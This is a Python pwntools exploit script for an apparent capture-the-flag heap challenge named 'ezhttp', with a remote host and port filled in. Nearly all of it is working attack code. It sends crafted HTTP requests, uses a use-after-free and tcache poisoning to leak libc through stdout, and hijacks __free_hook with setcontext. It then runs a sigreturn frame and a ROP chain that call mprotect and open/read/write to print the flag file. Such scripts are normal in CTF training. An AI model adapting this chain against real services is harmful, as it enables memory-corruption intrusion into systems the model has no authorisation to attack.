#-*- coding:utf-8 -*-
from PwnContext import *
try:
    from IPython import embed as ipy
except ImportError:
    print ('IPython not installed.')
context.terminal = ['tmux','splitw','-h']
s       = lambda data               :ctx.send(str(data))
sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
sl      = lambda data               :ctx.sendline(str(data)) 
sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :ctx.recv(numb)
ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
irt     = lambda                    :ctx.interactive()
rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))
leak_libc = lambda data=0 :uu64(ru('\x7f',drop=False)[-6:])-data

debugg = 1
logg = 0
ctx.binary = './ezhttp'

ctx.breakpoints=[0x13ad,0x1712]
ctx.symbols={'lst':0x203120}
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so',checksec=False)
if debugg:
    rs()
else:
    ctx.remote = ('183.129.189.62', 57602)
    rs('remote')
#ctx.start("gdb",gdbscript="set follow-fork-mode child\nc")
if logg:
    context.log_level='debug'
def lg(name, val):
    log.info(name+" : "+hex(val))    
def cmd(i):
    sla('scenery',i)

secret='\xea'
def add(c):#>=0x80c
    pay = '''POST /create
    Cookie: user=admin
    token: '''+secret+'\x0d' + '\x0d\x0a\x0d\x0a'
    pay+= 'content=' + c
    sa('me: ========',pay)

def free(idx):#UAF
    pay = '''POST /del
    Cookie: user=admin
    token: '''+secret+'\x0d' + '\x0d\x0a\x0d\x0a'
    pay+= 'index=' + str(idx)
    sa('me: ========',pay)

def show(idx):
    cmd(4)
    sla('idx:',idx)
    ru('see')
    
def edit(idx, data):
    pay = '''POST /edit
    Cookie: user=admin
    token: '''+secret+'\x0d' + '\x0d\x0a\x0d\x0a'
    pay+= 'index=' + str(idx)
    pay+= '&content=' + str(data)+'\n'
    sa('me: ========',pay)

#def exp():  
try:
    add('a'*0x80)#0
    
    ru('Your gift:')
    heap = int(ru('"'),16)
    lg('heap',heap)

    add('a'*0x10)#1
    add('a'*0x100)#2
    add('a'*0x100)#3
    free(0)
    add('a'*0x80)#4

    for i in range(7):
        free(0)
    free(0)
    
    #flag
    stdout = 0xe760
    dbg()
    ipy()
    edit(4,p16(stdout))
    free(1)
    add('a'*0x18)#5
    free(1)
    free(1)
    free(1)
    edit(5,p64(heap))
    add('a'*0x18)
    add('\x80')
    pay = p64(0xfbad1880)
    add(pay)

    #dbg()
    free(1)
    free(1)
    free(1)
    edit(5,p64(heap))
    add('a'*0x18)
    add('a'*0x18)
    pay = '\x80'
    add(pay)

    libc_base = leak_libc(0x3ec000) & ~0xfff
    lg('libc_base',libc_base)
    fh = libc.sym['__free_hook']+libc_base
    sys = libc.sym['system']+libc_base
    
    
    free(1)
    free(1)
    
    edit(5,p64(fh))
    add('b'*0x18)
    
    add(p64(libc_base+libc.sym['setcontext']+53))
    lg('set',libc_base+libc.sym['setcontext']+127)
    #dbg()
    p_rsp=0x3960+libc_base
    p_rdi=0x02155f+libc_base
    p_rsi = 0x23e8a+libc_base
    p_rdx = 0x1b96+libc_base

    frame = SigreturnFrame()
    frame.rdi = heap&~0xfff #0x68
    frame.rsi = 0x1000      #0x70
    frame.rdx = 7           #0x88
    frame.rsp = heap+0x1c0  #0xa0
    frame.rip = libc_base+libc.sym['mprotect']  #0xa8
    print(len(str(frame)))#0xf8

    shellcode  = p64(p_rdi)+ p64(heap+0xb0) + p64(p_rsi)+p64(0)+p64(libc.sym['open']+libc_base)
    shellcode += p64(p_rdi)+ p64(4) + p64(p_rsi) + p64(heap)  +p64(p_rdx) + p64(0x30) + p64(libc.sym['read']+libc_base)
    shellcode += p64(p_rdi)+ p64(1) + p64(p_rsi) + p64(heap)  +p64(p_rdx) + p64(0x30) + p64(libc.sym['write']+libc_base)
    print(len(shellcode))#0x98
    #edit(2,'./flag'+'\0'*2 + '3'*0x60 +p64(heap&~0xfff) + p64(0x1000)+'3'*0x10+p64(7)+'3'*0x10+p64(heap+0x1c0)+p64(libc_base+libc.sym['mprotect']))
    edit(2,'./flag'+'\0'*2 + str(frame)[8:])
    edit(3,shellcode)
    free(2)

    irt()
except Exception as err:
    print(err)
except EOFError:
    ctx.close()
    #return False
#exp()